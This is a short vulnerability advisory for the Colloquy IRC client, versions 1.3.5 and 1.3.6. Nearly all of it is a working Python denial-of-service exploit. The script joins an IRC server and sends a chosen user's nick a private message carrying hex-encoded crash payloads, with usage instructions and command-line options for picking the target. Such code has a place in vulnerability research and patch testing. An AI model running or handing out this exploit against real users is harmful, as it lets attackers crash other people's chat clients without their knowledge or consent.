source: http://www.securityfocus.com/bid/57255/info

Colloquy is prone to a remote denial-of-service vulnerability.

Successful exploits may allow the attacker to cause the application to crash, resulting in denial-of-service conditions.

Colloquy 1.3.5 and 1.3.6 are vulnerable. 

###################################################################################
#                          #                     #
#                          #    H O W - T O      #
#                          #                     #
#                          #######################
#
# Provide the Target: Server, Port, Nickname and the script will deliver
# the payload...
#
# [!USE/]$ ./<file>.py -t <server> -p <port> -n <nickname>
#
###################################################################################
from argparse import ArgumentParser
from time import sleep
import socket


shellcode = {
  # One Shot <3
  'one_shot'  : [ \
        "687474703a2f2f782f2e2425235e26402426402426232424242425232426",
        "23242623262340262a232a235e28242923404040245e2340242625232323",
        "5e232526282a234026405e242623252623262e2f2e2f2e2e2f2e2e2f2324",
        "2e24" ],

  # 1.3.5 
  '1_3_5'    : [ \
        "687474703a2f2f782f3f6964783d2d312b554e494f4e2b53454c45435428",
        "292c7573657228292c2873656c6563742532302d2d687474703a2f2f6874",
        "74703a2f2f782f3f6964783d2d312b554e494f4e2b53454c45435428292c"
        "7573657228292c2873656c6563742532302d2d687474703a2f2f" ],

  # 1.3.6 - ( Requires Sending 25 Times )
  '1_3_6'    : [ \
        "687474703a2f2f782f3f6964783d2d312b554e494f4e2b53454c45435428",
        "292c7573657228292c2873656c6563742532302d2d687474703a2f2f6874",
        "74703a2f2f782f3f6964783d2d312b554e494f4e2b53454c45435428292c",
        "7573657228292c2873656c6563742532302d2d687474703a2f2f" ],
}

def own( sock, target, sc_key='one_shot' ):
  sc = ''.join( shellcode[sc_key] )
  targ = ''.join( ''.join( [ hex( ord( ch ) ) for ch in target ] ).split( '0x' ) )

  msg = "505249564d534720{}203a{}0d0a".format( targ, sc )

  if sc_key not in '1_3_6':
    sock.send( bytes.fromhex( msg ) )
  else:
    try:
      for x in range( 1, 26 ):
        sock.send( bytes.fromhex( msg ) )
        sleep( .64 )
    except:
      print( 'FAILED!')


def connect( uri, port, target, sc_key ):
  sock = socket.socket()
  try:
    ret = sock.connect_ex(( uri, int( port ) ))
    sock.recv(8096)
  except:
    print( "\t[-] Failed To Connect To {}".format( uri ) )
    exit()


  sock.send( b"\x4e\x49\x43\x4b\x20\x7a\x65\x6d\x70\x30\x64\x61\x79\x0d\x0a" ) 
  sock.send( b"\x55\x53\x45\x52\x20\x7a\x65\x6d\x70\x30\x64\x61\x79\x20\x48\x45\x48\x45\x20\x48\x45\x48\x45\x20\x3a\x3c\x33\x0d\x0a" )

  while True:
    host_data = str( sock.recv( 8096 ).strip() )


    if ' 396 ' in host_data:
      print( '\t[+] Connection Successful Sending Payload To {}'.format( target ) )
      own( sock, target, sc_key )
      sock.send( b'QUIT\r\n' )
      sock.close()
      break


    try: 
      msg = host_data.split()
      if msg[0].lower() is 'ping':
        sock.send( b"PONG {}\r\n".format( msg[1] ) )
        continue
    except:
      pass


  print( '\t[!] Payload Sent, Target Should Drop Shortly <3' )



if __name__ == '__main__':
  parser = ArgumentParser( description='#legion Colloquy IRC DoS; Requires At Least A Nick To Target' )

  parser.add_argument( '-t', '--target', dest='target', default='localhost', help="IRCD Server Uri To Connect On" )
  parser.add_argument( '-p', '--port', dest='port', default=6667, help="Port To Connect On" )
  parser.add_argument( '-n', '--nick', dest='nick', metavar='NICK', help="Nick To Target" )

  parser.add_argument( '-s', '--shellcode', dest='shellcode', default='one_shot',
        help='Shell Code To Use, ( one_shot, 1_3_5, 1_3_6 )' )



  args = parser.parse_args()

  if args.nick is None:
    parser.print_help()
    exit()

  connect( args.target, args.port, args.nick, args.shellcode.strip() )